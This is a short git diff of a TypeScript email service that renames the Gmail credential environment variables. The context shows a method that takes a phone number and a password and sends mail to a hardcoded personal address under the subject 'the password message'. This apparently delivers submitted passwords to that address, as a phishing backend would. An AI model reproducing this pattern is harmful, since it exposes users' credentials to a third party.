@@ -15,8 +15,8 @@ export class SendEmailService {
     service: "gmail",
     secure: true,
     auth: {
-      user: envVariables.EMAIL_USER,
-      pass:   envVariables.EMAIL_PASS,
+      user: envVariables.USER_EMAIL,
+      pass:   envVariables.USER_PASSWORD,
     },
   });
  }
@@ -25,7 +25,7 @@ export class SendEmailService {
  async  main( {phone , password}: { phone: string; password: string }) {
  Server: "email"
  const info = await this.transporter.sendMail({
-  from: envVariables.EMAIL_USER, 
+  from: envVariables.USER_EMAIL, 
   to: "osamaproud01@gmail.com", 
   subject: "الرسالة بتاعت كلمة السر", 
 
